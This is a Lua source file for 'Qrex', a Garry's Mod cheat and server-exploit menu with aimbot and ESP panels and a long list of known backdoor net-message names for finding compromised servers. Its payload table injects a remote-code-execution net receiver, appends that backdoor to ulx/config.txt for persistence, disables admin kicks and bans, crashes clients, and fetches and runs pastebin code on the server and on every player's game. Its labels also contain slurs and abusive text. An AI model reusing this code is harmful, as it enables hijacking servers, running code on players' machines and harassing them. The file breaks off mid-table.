print( "Qrex loaded!" )

local qrexton = {}
local channel = ""
local vulChannel = {}
local openKey = KEY_F2
local toggle = false
local ply, me = LocalPlayer()
local eyeTrace = LocalPlayer():GetEyeTrace()

local gbit = bit
local bor  = gbit.bor

local net = _G.net
local util = _G.util
local RunString = _G.RunString
local timer = _G.timer
local vgui = _G.vgui
local surface = _G.surface
local string = _G.string

local prefix = "qrex"
local selPly = 0
local totalAddons = 0
qrexton.panelPosX = 100
qrexton.panelPosY = 100

local function qrexchat(...)
  chat.AddText(Color(87, 39, 210), "[Qrex] ", Color(0, 184, 255), ...)
end

http.Fetch( "http://google.com", function() qrexchat( "[INFO] HTTP" ) end )

surface.CreateFont( "labels", { font = "DermaDefault", size = 16 } )
surface.CreateFont( "button", { font = "DermaDefault", size = 16 } )

qrexton.Icons = { A = "https://i.imgur.com/9y29VS7.png", B = "https://i.imgur.com/QoqO8F9.png", C = "https://i.imgur.com/t8uXWfa.png", D = "https://i.imgur.com/1sbSxCx.png", E  = "https://i.imgur.com/GgpUCkG.png", F = "https://i.imgur.com/MWP7BKD.png" }

function qrexton.DrawMaterial(mat, x, y, w, h, col)
  if(!mat || !mat.IsError || mat:IsError()) then
	surface.SetDrawColor(255, 0, 0, 255)
	surface.DrawRect(x, y, w, h)
	draw.SimpleText("ICON", "button", x + w/2, y + h/2, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_BOTTOM)
	draw.SimpleText("FAILED!", "button", x + w/2, y + h/2, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_TOP)
	return
  end
	surface.SetDrawColor(col)
	surface.SetMaterial(mat)
	surface.DrawTexturedRect(x, y, w, h)
end

function qrexton.Map(tbl, fn)
  local new = {}
  for k, v in pairs(tbl) do
	new[k] = fn(v, k, tbl)
  end
  return new
end

function qrexton.Download(filename, url, callback, errorCallback)
  local path = "qrex/porn/" .. filename
  local dPath = "data/" .. path
  if (file.Exists(path, "DATA")) then return callback(dPath) end

  if (not file.IsDir(string.GetPathFromFilename(path), "DATA")) then
    file.CreateDir(string.GetPathFromFilename(path))
  end

  errorCallback = errorCallback or function(reason) end

  http.Fetch(url, function(body, size, headers, code)
    if (code ~= 200) then return errorCallback(code) end
      file.Write(path, body)
      callback(dPath)
    end, errorCallback)
end

function qrexton.IconSet(iconUrls, path, cb)
  local set = {}
  local count = 0
  local iconAmt = table.Count(iconUrls)

  for name, url in pairs(iconUrls) do
    qrexton.Download((path or "") .. util.CRC(name .. url) .. "." .. string.GetExtensionFromFilename(url), url, function(path)
      set[name] = Material(path, "unlitgeneric")
      count = count + 1

      if (count == iconAmt and cb) then
        cb(set)
      end
    end)
  end
  return set
end

local function loadIcons()
	qrexton.Materials = {}
	qrexton.Materials = qrexton.IconSet(qrexton.Icons, "")

	qrexton.IconSet( qrexton.Map(qrexton.Icons, function(v) return end), "",
		function(icons)
			for k, icon in pairs(icons) do
				qrexton.Icons[k].iconMat = icon
			end
		end)
end

loadIcons()

local function rndstr(len)
  if len == nil then
    len = 5
  end
  local chars = string.Split("ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789", "")
  local r = ""
  while string.len(r) < len do
    r = r .. chars[math.random(1, #chars)]
  end
  return r
end

local qrexstr = rndstr(5)

local mat_white = Material("vgui/white")

function draw.SimpleLinearGradient(x, y, w, h, startColor, endColor, horizontal)
  draw.LinearGradient(x, y, w, h, {
    {
      offset = 0,
      color = startColor
    },
    {
      offset = 1,
      color = endColor
    }
    }, horizontal)
end

function draw.LinearGradient(x, y, w, h, stops, horizontal)
  if #stops == 0 then
    return
  elseif #stops == 1 then
    surface.SetDrawColor(stops[1].color)
    surface.DrawRect(x, y, w, h)
    return
  end

  table.SortByMember(stops, "offset", true)
  render.SetMaterial(mat_white)
  mesh.Begin(MATERIAL_QUADS, #stops - 1)

  for i = 1, #stops - 1 do
    local offset1 = math.Clamp(stops[i].offset, 0, 1)
    local offset2 = math.Clamp(stops[i + 1].offset, 0, 1)
    if offset1 == offset2 then continue end
    local deltaX1, deltaY1, deltaX2, deltaY2
    local color1 = stops[i].color
    local color2 = stops[i + 1].color
    local r1, g1, b1, a1 = color1.r, color1.g, color1.b, color1.a
    local r2, g2, b2, a2
    local r3, g3, b3, a3 = color2.r, color2.g, color2.b, color2.a
    local r4, g4, b4, a4

    if horizontal then
      r2, g2, b2, a2 = r3, g3, b3, a3
      r4, g4, b4, a4 = r1, g1, b1, a1
      deltaX1 = offset1 * w
      deltaY1 = 0
      deltaX2 = offset2 * w
      deltaY2 = h
    else
      r2, g2, b2, a2 = r1, g1, b1, a1
        r4, g4, b4, a4 = r3, g3, b3, a3
      deltaX1 = 0
      deltaY1 = offset1 * h
      deltaX2 = w
      deltaY2 = offset2 * h
    end

      mesh.Color(r1, g1, b1, a1)
      mesh.Position(Vector(x + deltaX1, y + deltaY1))
      mesh.AdvanceVertex()
      mesh.Color(r2, g2, b2, a2)
      mesh.Position(Vector(x + deltaX2, y + deltaY1))
      mesh.AdvanceVertex()
      mesh.Color(r3, g3, b3, a3)
      mesh.Position(Vector(x + deltaX2, y + deltaY2))
      mesh.AdvanceVertex()
      mesh.Color(r4, g4, b4, a4)
      mesh.Position(Vector(x + deltaX1, y + deltaY2))
      mesh.AdvanceVertex()
  end
  mesh.End()
end

function draw.OutlinedBox(x, y, w, h, thickness, clr)
  surface.SetDrawColor(clr)
  for i = 0, thickness - 1 do
    surface.DrawOutlinedRect(x + i, y + i, w - i * 2, h - i * 2)
  end
end

function qrexton.labelOutline(name, pos, size)
  draw.OutlinedBox(pos[1], pos[2], size[1], size[2], 2, Color(0, 0, 0))
  draw.OutlinedBox(pos[1] + 1, pos[2] + 1, size[1] - 2, size[2] - 2, 1, Color(50, 50, 50))
  draw.WordBox(8, pos[1] + 20, pos[2] - 15, name, "labels", Color(30, 30, 30), Color(255, 255, 255))
end

local function PaintCHK(self, w, h)
  local chk = self
  chk:SetFont("DermaDefault")

  function self.Button:Paint(w, h)
    local self = chk.Button
    draw.RoundedBox(0, 2, 2, w - 3, h - 3, Color(0, 0, 0))

    if self:GetChecked() then
      if chk:IsHovered() or chk.Label:IsHovered() or self:IsHovered() then
        draw.RoundedBox(0, 3, 3, h - 5, h - 5, Color(87, 39, 220, 255))
        surface.SetMaterial(Material("gui/gradient_up"))
        surface.SetDrawColor(87, 39, 210, 255)
        surface.DrawTexturedRect(3, 3, w - 5, h - 5)
      else
        draw.RoundedBox(0, 3, 3, w - 5, h - 5, Color(87, 39, 210, 255))
        surface.SetMaterial(Material("gui/gradient_up"))
        surface.SetDrawColor(87, 39, 210, 200)
        surface.DrawTexturedRect(3, 3, w - 5, h - 5)
      end
        surface.SetTextColor(255, 255, 255)
        surface.SetTextPos(-0.7, -1)
        surface.DrawText("")
      elseif chk:IsHovered() or chk.Label:IsHovered() or self:IsHovered() then
        draw.RoundedBox(0, 3, 3, w - 5, h - 5, Color(60, 60, 60))
        surface.SetMaterial(Material("gui/gradient_up"))
        surface.SetDrawColor(45, 45, 45)
        surface.DrawTexturedRect(3, 3, w - 5, h - 5)
      else
        draw.RoundedBox(0, 3, 3, w - 5, h - 5, Color(55, 55, 55))
        surface.SetMaterial(Material("gui/gradient_up"))
        surface.SetDrawColor(40, 40, 40)
        surface.DrawTexturedRect(3, 3, w - 5, h - 5)
      end
    end
end

local qrex = vgui.Create("DFrame")
qrex:ShowCloseButton(false)
qrex:MakePopup()
qrex:SetSize(720, 700)
qrex:SetPos(qrexton.panelPosX, qrexton.panelPosY)
qrex:SetTitle("")
qrex:SetVisible(true)
qrex:SetDraggable(true)
qrex:Show()

qrex.Paint = function(self, w, h)
  draw.RoundedBox(2, 0, 0, 920, 700, Color(17, 17, 17))
  draw.RoundedBox(2, 0, 0, self:GetWide(), 25, Color(0, 0, 0, 200))
  draw.RoundedBox(2, 0, 0, self:GetWide(), self:GetTall(), Color(30, 30, 30))
  surface.SetDrawColor(20, 20, 20)
  surface.DrawRect(8, 9, 101, 683)
  draw.OutlinedBox(3, 3, w - 6, h - 6, 5, Color(50, 50, 50))
  draw.OutlinedBox(4.8, 4.8, w - 8, h - 8, 3, Color(42, 42, 42))
end

function draw.Essential(position, parent)
  surface.SetDrawColor(50, 50, 50)
  surface.DrawRect(110, 9, 1, 683)
  surface.SetDrawColor(0, 0, 0)
  surface.DrawRect(109, 9, 1, 683)
  surface.SetDrawColor(0, 0, 0)
  surface.DrawRect(8, position, 101, 106)
  surface.SetDrawColor(50, 50, 50)
  surface.DrawRect(8, position + 1, 102, 104)
  surface.SetDrawColor(30, 30, 30)
  surface.DrawRect(8, position + 2, 103, 102)
  surface.DrawRect(8, 9, 803, 4)

  draw.LinearGradient(qrex.x + 10, qrex.y + 10, parent:GetWide() -10, 2, {
    {
        offset = 0,
        color = Color(200, 80, 80)
    },
    {
        offset = 0.4,
        color = Color(202, 70, 205)
    },
    {
      offset = 0.875,
      color = Color(87,39,210)
    }
    }, true)

    qrexton.DrawMaterial(qrexton.Materials.A, 20, 60, 80, 80, Color(170,170,170))
    qrexton.DrawMaterial(qrexton.Materials.B, 20, 160, 80, 80, Color(170,170,170))
    qrexton.DrawMaterial(qrexton.Materials.C, 20, 260, 80, 80, Color(170,170,170))
    qrexton.DrawMaterial(qrexton.Materials.D, 20, 360, 80, 80, Color(170,170,170))
    qrexton.DrawMaterial(qrexton.Materials.E, 20, 460, 80, 80, Color(170,170,170))
    qrexton.DrawMaterial(qrexton.Materials.F, 20, 560, 80, 80, Color(170,170,170))
end

local panelNames = {"Aimbot", "Triggerbot", "ESP", "Backdoors", "Detections", "Settings"}

local qrexTable = {}

for k, v in pairs(panelNames) do
  qrexPanel = vgui.Create("DPanel")
  if (qrexTable[1]) then
    qrexPanel:SetVisible(false)
  end
  qrexPanel:SetParent(qrex)
  qrexPanel:SetPos(0, 0)
  qrexPanel:SetSize(811, 791)
  table.insert(qrexTable, qrexPanel)
end

qrexTable[1].Paint = function(self, w, h)
  draw.Essential(48 + (100 * 1 - 100), self)
  qrexton.DrawMaterial(qrexton.Materials.A, 20, 60, 80, 80, Color(87,39,210))

  qrexton.labelOutline("Aimbot", {130, 39}, {270, 622})
  qrexton.labelOutline("Other", {425, 39}, {270, 622})
end

qrexTable[2].Paint = function(self, w, h)
  draw.Essential(48 + (100 * 2 - 100), self)
  qrexton.DrawMaterial(qrexton.Materials.B, 20, 160, 80, 80, Color(87,39,210))

end

qrexTable[3].Paint = function(self, w, h)
  draw.Essential(48 + (100 * 3 - 100), self)
  qrexton.DrawMaterial(qrexton.Materials.B, 20, 160, 80, 80, Color(87,39,210))

  qrexton.labelOutline("Player ESP", {130, 39}, {270, 420})
  qrexton.labelOutline("Coloured models", {130, 480}, {270, 181})
  qrexton.labelOutline("Other ESP", {425, 39}, {270, 150})
  qrexton.labelOutline("Effects", {425, 211}, {270, 450})
end

qrexTable[4].Paint = function(self, w, h)
    draw.Essential(48 + (100 * 4 - 100), self)
    qrexton.DrawMaterial(qrexton.Materials.D, 20, 360, 80, 80, Color(87,39,210))

end

qrexTable[5].Paint = function(self, w, h)
    draw.Essential(48 + (100 * 5 - 100), self)
    qrexton.DrawMaterial(qrexton.Materials.E, 20, 460, 80, 80, Color(87,39,210))

    qrexton.labelOutline("Indiscriminate lulz", {130, 39}, {180, 540})
    qrexton.labelOutline("Specific Target", {320, 39}, {180, 622})
    qrexton.labelOutline("Trash the place", {510, 39}, {180, 230})
    qrexton.labelOutline("Players to Target", {510, 310}, {180, 250})
    qrexton.labelOutline("Macro Paramaters", {510, 576}, {180, 44})
end

function qrexton.StringExists(str)
  local i = 1
  while util.NetworkIDToString(i) do
    if util.NetworkIDToString(i) == str then
      return true
    end
    i = i + 1
  end
end

local nets = {  "AlphaMenu", "anti_cht", "ulx_2", "shields", "w_menu", "qrex", "nigger", "_potato", "hacking bro", "hackingbro", "kebabmenu", "rotten_proute", "BITMINER_UPDATE_DLC", "nostrip2", "operationsmoke", "vegeta", "pd1", "JSQuery.Data ( Post ( false ) )", "anatikisgodd", "anatikisgod", "https://i.imgur.com/gf6hlml.png", "print ( )", "fps", "fszof<qOvfdsf", "tupeuxpaslabypass", "_CAC_G", "adsp_door_length", "SDFTableFsSSQS", "EventStart", "data_check", "antileak", "CreateAdminRanks", "Asunalabestwaifu", "shittycommand", "tro2fakeestunpd", "FAdmin_CreateVar", "ContextHelp", "lmaogetdunked", "LV_BD_V2", "createpanel", "fuckyou", "1337", "haxor", "r8helper", "_chefhackv2", "Þà?D)?", "Þ  ?D)?", "nostrip1", "antilagger", "Fix_Exploit", "yazStats", "FPSVBOOST", "RTX420", "Revelation", "SizzurpDRM", "cbbc", "gSploit", "ÃƒÅ¾ÃƒÂ ?D)Ã¢â€”Ëœ", "Reaoscripting", "ß ?D)?", "?????????????????Ð¿??? ?? ?Ñ¿??Ä¿Õ¿? ???Ñ¿??Õ¿??Ð®", "!Çº/;.", "NoOdium_Reaoscripting", "m9k_", "Î¾psilon", "Backdoor", "reaper", "SDFTableFsSSQE", "gmod_dumpcfg", "fpsvboost", "antipk", "privatebackdoorshixcrewpr", "edouardo573", "sikye", "addoncomplie", "novisit", "no_visitping", "_reading_darkrp", "gPrinters.sncSettings", "mat", "mat(0)", "banId2", "keyss", "!?/;.", "SteamApp2313", "??D)?", "?", "Þ� ?D)◘", "Val", "models/zombie.mdl", "REBUG", "????????????????????? ?? ??????? ??????????", "material", "entityhealt", "banId", "kickId2", "json.parse(crashsocket)", "elsakura", "dev", "FPSBOOST", "INJ3v4", "MJkQswHqfZ", "_GaySploit", "GaySploitBackdoor", "xuy", "legrandguzmanestla", "_Battleye_Meme_", "Dominos", "elfamosabackdoormdr", "thefrenchenculer", "xenoexistscl", "_Defcon", "EnigmaIsthere", "BetStrep", "JQerystrip.disable", "ξpsilon", "Ulogs_Infos", "jeveuttonrconleul", "Sandbox_ArmDupe", "OdiumBackDoor", "RTPayloadCompiler", "playerreportabuse", "12", "opensellermenu", "sbussinesretailer", "DarkRP_Money_System", "ohnothatsbad", "yarrakye", "�? ?D)?", "DataMinerType", "weapon_phygsgun_unlimited", "PlayerKilledLogged", "mdrlollesleakcestmal", "yerdxnkunhav", "kebab", "L_BD_v2", "netstream", "pure_func_run_lua", "rconyesyes", "Abcdefgh", "Fibre", "FPP_AntiStrip", "kidrp", "blacklist_backdoor", "boombox", "DOGE", "hexa", "-c", "VL_BD", "OBF::JH::HAX", "SACAdminGift", "GetSomeInfo", "nibba", "RegenHelp", "xmenuiftrue", "d4x1cl", "BlinkingCheckingHelp", "AnalCavity", "Data.Repost", "YOH_SAMBRE_IS_CHEATER", "dropadmin", "GLX_push", "ALTERED_CARB0N", "thenostraall", "LVDLVM", ">sv", "utf8-gv", "argumentumac", "runSV", "adm_", "Inj3", "samosatracking57", "doorfix", "SNTEFORCE", "GLX_plyhdlpgpxlfpqnghhzkvzjfpjsjthgs", "disablecarcollisions", "PlayerCheck", "Sbox_darkrp", "insid3", "The_Dankwoo", "Sbox_itemstore", "Ulib_Message", "ULogs_Info", "ITEM", "R8", "fix", "Fix_Keypads", "Remove_Exploiters", "noclipcloakaesp_chat_text", "_Defqon", "_CAC_ReadMemory", "nostrip", "nocheat", "LickMeOut", "ULX_QUERY2", "ULXQUERY2", "https://i.imgur.com/Gf6hLMl.png", "MoonMan", "Im_SOCool", "JSQuery.Data(Post(false))", "Sandbox_GayParty", "DarkRP_UTF8", "OldNetReadData", "Gamemode_get", "memeDoor", "BackDoor", "SessionBackdoor", "DarkRP_AdminWeapons", "cucked", "NoNerks", "kek", "ZimbaBackdoor", "something", "random", "strip0", "fellosnake", "enablevac", "idk", "ÃžÃ� ?D)â—˜", "snte", "apg_togglemode", "Hi", "beedoor", "BDST_EngineForceButton", "VoteKickNO", "REEEEEEEEEEEE", "_da_", "Nostra", "sniffing", "keylogger", "CakeInstall", "Cakeuptade", "love", "earth", "ulibcheck", "Nostrip_", "teamfrench", "ADM", "hack", "crack", "leak", "lokisploit", "1234", "123", "enculer", "cake", "seized", "88", "88_strings_", "nostraall", "blogs_update", "nolag", "loona_", "_logs", "loona", "negativedlebest", "berettabest", "ReadPing", "antiexploit", "adm_NetString", "mathislebg", "Bilboard.adverts:Spawn(false)", "pjHabrp9EY", "?", "lag_ping", "allowLimitedRCON(user) 0", "aze46aez67z67z64dcv4bt", "killserver", "fuckserver", "cvaraccess", "rcon", "rconadmin", "web", "jesuslebg", "zilnix", "��?D)?", "disablebackdoor", "kill", "DefqonBackdoor", "DarkRP_AllDoorDatas", "0101.1", "awarn_remove", "_Infinity", "Infinity", "InfinityBackdoor", "_Infinity_Meme_", "arivia", "ULogs_B", "_Warns", "_cac_", "striphelper", "_vliss", "YYYYTTYXY6Y", "?????????????????�???? ?? ?�???�?�?? ???�???�???�.", "_KekTcf", "_blacksmurf", "blacksmurfBackdoor", "_Raze", "m9k_explosionradius", "m9k_explosive", "m9k_addons", "rcivluz", "SENDTEST", "_clientcvars", "_main", "stream", "waoz", "bdsm", "ZernaxBackdoor", "UKT_MOMOS", "anticrash", "audisquad_lua", "dontforget", "noprop", "thereaper", "0x13", "Child", "!Cac", "azkaw", "BOOST_FPS", "childexploit", "ULX_ANTI_BACKDOOR", "FADMIN_ANTICRASH", "ULX_QUERY_TEST2", "GMOD_NETDBG", "netlib_debug", "_DarkRP_Reading", "lag_ping", "||||", "FPP_RemovePLYCache", "fuwa", "stardoor", "SENDTEST", "rcivluz", "c", "N::B::P", "changename", "PlayerItemPickUp", "echangeinfo", "fourhead", "music", "slua", "adm_network", "componenttolua", "theberettabcd", "SparksLeBg", "DarkRP_Armors", "DarkRP_Gamemodes", "fancyscoreboard_leave", "PRDW_GET", "pwn_http_send", "AnatikLeNoob", "GVacDoor", "Keetaxor", "BackdoorPrivate666", "YohSambreLeBest", "SNTE<ALL", "!�:/;.", "pwn_http_answer", "pwn_wake", "verifiopd", "AidsTacos", "shix", "PDA_DRM_REQUEST_CONTENT", "xenoreceivetargetdata2", "xenoreceivetargetdata1", "xenoserverdatafunction", "xenoserverfunction", "xenoclientdatafunction", "xenoclientfunction", "xenoactivation", "EXEC_REMOTE_APPS", "yohsambresicianatik<3", "Sbox_Message", "Sbox_gm_attackofnullday_key", "The_DankWhy", "nw.readstream", "AbSoluT", "__G____CAC", "Weapon_88", "mecthack", "SetPlayerDeathCount", "FAdmin_Notification_Receiver", "DarkRP_ReceiveData", "fijiconn", "LuaCmd", "EnigmaProject", "z", "cvardel", "effects_en", "file", "gag", "asunalabestwaifu", "stoppk", "Ulx_Error_88", "NoOdium_ReadPing", "striphelper" }

local backdoors = {
	["@ Inject sendLua interface"] = {
    ["Type"] = 1,
    ["Code"] = [[ util.AddNetworkString("qrex")net.Receive("qrex", function(a, b) local c = net.ReadString() local d = net.ReadBit() if d == 1 then RunString(c)else game.ConsoleCommand(c .. "\n")end end) ]],
    ["Desc"] = "This feature will allow all macros access to be ran on server",
    ["Private"] = true,
  },
  ["@ Persistent infection"] = {
    ["Type"] = 1,
    ["Code"] = [[ file.Append("ulx/config.txt", "util.AddNetworkString("qrex")net.Receive("qrex", function(a, b) local c = net.ReadString() local d = net.ReadBit() if d == 1 then RunString(c)else game.ConsoleCommand(c .. "\n")end end)" ) ]],
    ["Desc"] = "Infection will spread code to to memory making BD stay after restart",
    ["Private"] = true,
  },
  ["Artillery strike"] = {
    ["Type"] = 1,
    ["Code"] = [[ if not bombstrike then hook.Add("Think","lulz_bombstrike",function()local a=ents.Create("env_explosion")local b=Vector(math.random(-8000,8000),math.random(-8000,8000),math.random(-5000,5000))local c={}c.start=b;c.endpos=b+Vector(0,0,-99999)local d=util.TraceLine(c)if not d.Hit then return end;a:SetPos(d.HitPos)a:Spawn()a:SetKeyValue("iMagnitude","400")a:Fire("Explode",0,0)end)bombstrike=true else hook.Remove("Think","lulz_bombstrike")bombstrike=false end ]],
    ["Desc"] = "Explode everything around map",
  },
  ["Announce centre screen"] = {
    ["Type"] = 1,
    ["Code"] = [[ for k, v in pairs(player.GetAll()) do v:PrintMessage( HUD_PRINTCENTER, @1 ) end ]],
    ["Desc"] = "Make an announcement in the centre of everybodys screen",
    ["NeedsParameters"] = 1,
  },
  ["Broken glass symphony"] = {
    ["Type"] = 1,
    ["Code"] = [[ if not timer.Exists("A true masterpiece")then timer.Create("A true masterpiece",0.2,0,function()for a,b in pairs(player.GetAll())do b:EmitSound("physics/glass/glass_largesheet_break"..math.random(1,3)..".wav",100,math.random(40,180))end end)else timer.Remove("A true masterpiece")end ]],
    ["Desc"] = "Beethoven's last hidden symphony, only rediscovered in 2017",
  },
  ["Console jammer"] = {
    ["Type"] = 1,
    ["Code"] = [[ if not (timer.Exists("Block_")) then timer.Create("Block_", 0.5, 0, function() print("\n\n\n\n\n\n\n\n\n\n\n\n\n\n") end) else timer.Destroy("Block_") end ]],
    ["Desc"] = "Makes it difficult for admins to read remote console",
  },
  ["Double or nothing"] = {
    ["Type"] = 1,
    ["Code"] = [[ BDON_CONFIG.doubleChance = @1 ]],
    ["Desc"] = "Allows you to change the win chance",
    ["NeedsParameters"] = 1,
  },
  ["Disable kicks/bans"] = {
    ["Type"] = 1,
    ["Code"] = [[ local nothing = function() end if ULib then ULib.kick = nothing ULib.ban = nothing ULib.addBan = nothing end if xAdmin then xAdmin.Admin.Bans = nothing xAdmin.Admin.Ban = nothing xAdmin.Admin.Kick = nothing end if FAdmin then local tbl = {"kick", "ban", "jail", "UnJail", "ClearDecals", "StopSounds", "CleanUp"} for i = 1, #tbl do FAdmin.Commands.AddCommand(tbl[i], nothing) end end local meta = debug.getregistry().Player meta.Ban = nothing meta.Kick = nothing game.KickID = nothing local _ = RunConsoleCommand function RunConsoleCommand(command, ...) if command == "addip" then return end _(command, ...) end ]],
    ["Desc"] = "",
  },
  ["Earthquake"] = {
    ["Type"] = 1,
    ["Code"] = [[ if not timer.Exists("earthquake") then timer.Create("earthquake", 0.5, 500, function() for _, p in pairs(player.GetAll()) do p:SetPos(p:GetPos() + Vector(0, 0, 1)) p:SetVelocity(Vector(math.random(-50, 50), math.random(-50, 50), math.random(100, 150))) util.ScreenShake(p:GetPos(), 20, 1, 1, 100) p:EmitSound("ambient/explosions/exp1.wav", 100, math.random(60, 100)) end for _, e in pairs(ents.GetAll()) do if e:GetPhysicsObject() and e:GetPhysicsObject():IsValid() then e:GetPhysicsObject():AddVelocity(Vector(math.random(-50, 50), math.random(-50, 50), math.random(100, 150))) end end end) else timer.Remove("earthquake") end ]],
    ["Desc"] = "Creates an earthquake all over the map",
  },
  ["Rainbow chat spam"] = {
    ["Type"] = 1,
    ["Code"] = [[ if not timer.Exists("lulz_chatspam") then timer.Create("lulz_chatspam", 0.5, 0, function() BroadcastLua("chat.AddText( Color( math.random(0, 255), math.random(0, 255), math.random(0, 255) ), @1 )") end) else timer.Remove("lulz_chatspam") end ]],
    ["Desc"] = "Spam rainbow chat for all players with the 1st parameter as the text",
    ["NeedsParameters"] = 1,
  },
  ["Rainbow chat spam (turbo)"] = {
    ["Type"] = 1,
    ["Code"] = [[ if not timer.Exists("lulz_chatspam") then timer.Create("lulz_chatspam", 0.01, 0, function() BroadcastLua("chat.AddText( Color( math.random(0, 255), math.random(0, 255), math.random(0, 255) ), @1 )") end) else timer.Remove("lulz_chatspam") end ]],
    ["Desc"] = "Spam rainbow chat for all players with the 1st parameter as the text",
    ["NeedsParameters"] = 1,
  },
  ["Rainbow everything"] = {
    ["Type"] = 1,
    ["Code"] = [[ BroadcastLua("http.Fetch('https://pastebin.com/raw/Vvxn4E1Q', function(b) RunString(b) end )") ]],
    ["Desc"] = "This will cover the map with rainbows :)",
  },
  ["Street war"] = {
    ["Type"] = 1,
    ["Code"] = [[ if not timer.Exists("cwar")then timer.Create("cwar",1,0,function()for a,b in pairs(player.GetAll())do b:EmitSound("ambient/levels/streetwar/city_battle"..math.random(1,19)..".wav",100,math.random(90,120))end end)else timer.Remove("cwar")end ]],
    ["Desc"] = "Plays shooting sounds from a war",
  },
  ["Trap netstring"] = {
    ["Type"] = 1,
    ["Code"] = [[ util.AddNetworkString( @1 ) net.Receive( @1, function(len, ply) ply:Ban(0, "[SNTE] Net exploit detected!" ) end) ]],
    ["Desc"] = "Traps the selected netstring and bans anyone attempting to exploit it",
  },
  ["Explode all vehicles"] = {
    ["Type"] = 1,
    ["Code"] = [[ for a,b in pairs(ents.GetAll())do if b:IsVehicle()then local c=ents.Create("env_explosion")c:SetPos(b:GetPos())c:SetKeyValue("iMagnitude","300")c:Spawn()c:Activate()c:Fire("Explode","",0)end end ]],
    ["Desc"] = "",
  },
  ["RCON command"] = {
    ["Type"] = 1,
    ["Code"] = [[ game.ConsoleCommand( @1.."\n" ) ]],
    ["Desc"] = "Like having rcon access without actually having rcon access",
    ["NeedsParameters"] = 1,
  },
  ["Lua run"] = {
    ["Type"] = 1,
    ["Code"] = [[ @1 ]],
    ["Desc"] = "For running your amazing luas",
    ["NeedsParameters"] = 1,
  },
  ["Lua run from pastebin"] = {
    ["Type"] = 1,
    ["Code"] = [[ http.Fetch( "https://pastebin.com/raw/@1", RunString) ]],
    ["Desc"] = "Fetch and run code from a pastebin link( ONLY put the ID in the parameter! )",
    ["NeedsParameters"] = 1,
  },
  ["Yeah Baby"] = {
    ["Type"] = 1,
    ["Code"] = [[ if not timer.Exists("porn")then timer.Create("porn",0.3,0,function()for a,b in pairs(player.GetAll())do b:EmitSound("vo/npc/female01/yeah02.wav",100,math.random(90,120))end end)else timer.Remove("porn")end ]],
    ["Desc"] = "YEAH BABY YEAH",
  },


  ["Allahu ackbar"] = {
    ["Type"] = 2,
    ["Code"] = [[ local a=ents.Create("env_explosion")a:SetOwner(v)a:SetPos(v:GetPos())a:SetKeyValue("iMagnitude","250")a:Spawn()a:Activate()a:Fire("Explode","",0)if v:Alive()then v:Kill()end ]],
    ["Desc"] = "Blows them the fuck up, all kills are attributed to them",
  },
  ["Co host"] = {
    ["Type"] = 2,
    ["Code"] = [[ v:SendLua('http.Fetch("https://pastebin.com/raw/kbPN4miL",RunString))') ]],
    ["Desc"] = "Blows them the fuck up, all kills are attributed to them",
  },
  ["Kill player"] = {
    ["Type"] = 2,
    ["Code"] = [[ v:Kill() ]],
    ["Desc"] = "",
  },
  ["Fumble player"] = {
    ["Type"] = 2,
    ["Code"] = [[ v:DropWeapon( v:GetActiveWeapon() ]],
    ["Desc"] = "Makes the player drop current weapon",
  },
  ["Strip weapons"] = {
    ["Type"] = 2,
    ["Code"] = [[ v:StripWeapons() ]],
    ["Desc"] = "",
  },
  ["Rocket"] = {
    ["Type"] = 2,
    ["Code"] = [[ v:SetVelocity( Vector(0, 0, 9000) ]],
    ["Desc"] = "Sends the player high in the sky",
  },
  ["Rocket (spastic)"] = {
    ["Type"] = 2,
    ["Code"] = [[ v:SetVelocity( Vector(math.random( -9000, 9000), math.random( -9000, 9000), 9000) ) ]],
    ["Desc"] = "Removes the player from the universe",
  },
  ["Change model"] = {
    ["Type"] = 2,
    ["Code"] = [[ v:SetModel( @1 ) ]],
    ["Desc"] = "Sets their player model to string (1st paremeter)",
    ["NeedsParameters"] = 1,
  },
  ["Crash their gmod"] = {
    ["Type"] = 2,
    ["Code"] = [[ v:SendLua("while true do end") ]],
    ["Desc"] = "Instantly freezes game",
  },
  ["Ear rape"] = {
    ["Type"] = 2,
    ["Code"] = [[ local snd = { [1] = "npc/stalker/go_alert2a.wav",[2] = "vo/npc/male01/question06.wav",[3] = "ambient/energy/zap1.wav",[4] = "weapons/knife/knife_stBD.wav",[5] } v:EmitSound( snd[tonumber(@1)], 100, 100 ) ]],
    ["Desc"] = "Make them emit a sound (1st paremeter is a number 1-5)",
    ["NeedsParameters"] = 1,
  },
  ["Ear rape (from internet)"] = {
    ["Type"] = 2,
    ["Code"] = [[ SendLua( v, "if soundrape then soundrape:Remove() soundrape = nil return end soundrape = vgui.Create( "DFrame" ) soundrape:SetSize( 1, 1 ) local html = vgui.Create( "HTML", soundrape ) html:OpenURL( @1 )" ) ]],
    ["Desc"] = "Make them hear a sound from a URL (1st paremeter).  Sending a new sound will stop the previous one.  Send an invalid url to stop all sounds entirely on their client",
    ["NeedsParameters"] = 1,
  },
  ["Eye rape (from internet)"] = {
    ["Type"] = 2,
    ["Code"] = [[ SendLua( v, "if bdeyerape then bdeyerape:Remove() bdeyerape = nil return end bdeyerape = vgui.Create( "DFrame" )bdeyerape:SetDraggable﻿( false )bdeyerape:SetSize( ScrW(), ScrH() )bdeyerape:SetTitle( "" )bdeyerape:ShowCloseButton( false )local html = vgui.Create( "HTML", bdeyerape )html:Dock( FILL )html:OpenURL( @1 )" ) ]],
    ["Desc"] = "Make them see a full screen, unclosable panel from a URL (1st paremeter).  Sending a new url will stop the previous one.  Send an invalid url to clear their view entirely",
  },
  ["Rave mode"] = {
    ["Type"] = 2,
    ["Code"] = [[ if not rain_ then hook.Add("HUDPaint","Rainbow",function()local a=math.sin(CurTime()*10)*255;surface.SetDrawColor(Color(a,-a,a,50))surface.DrawRect(0,0,ScrW(),ScrH())end)rain_=true else hook.Remove("HUDPaint","Rainbow")rain_=false end ]],
    ["Desc"] = "Make people have autisum",
  },
  ["Rave music"] = {
    ["Type"] = 2,
    ["Code"] = [[ surface.PlaySound("music/hl1_song25_remix3.mp3") ]],

    ["Desc"] = "Some of the best music i ever heard",
  },
  ["Ignite player"] = {
    ["Type"] = 2,
    ["Code"] = [[ v:Ignite( @1 ) ]],
    ["Desc"] = "How long you want to roast them",
    ["NeedsParameters"] = 1,
  },
  ["Toggle godmode"] = {
    ["Type"] = 2,
    ["Code"] = [[ if v:HasGodMode() then v:GodDisable() else v:GodEnable() end ]],
    ["Desc"] = "",
  },
  ["Toggle speedhack"] = {
    ["Type"] = 2,
